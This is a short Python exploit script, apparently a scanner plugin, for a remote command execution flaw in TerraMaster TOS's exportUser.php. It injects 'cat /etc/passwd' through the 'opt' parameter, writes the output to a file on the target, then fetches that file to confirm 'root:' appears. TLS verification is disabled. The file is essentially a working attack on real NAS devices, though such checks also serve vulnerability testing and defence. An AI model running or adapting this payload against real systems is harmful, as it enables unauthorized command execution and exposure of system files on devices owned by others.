#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'TerraMaster TOS exportUser.php 远程命令执行',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/include/exportUser.php?type=3&cla=application&func=_exec&opt=(cat%20/etc/passwd)>test.txt'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200:
      resp=requests.get(url=url+'/test.txt',headers=headers,timeout=5,verify=False)
      if resp.status_code == 200 and 'root:' in resp.text:

        # ret['huixian'] = res.text
        ret['ifbug'] = True
        res.close()
        return ret
      else:
        return ret
    else:
      return ret
  except:
    return ret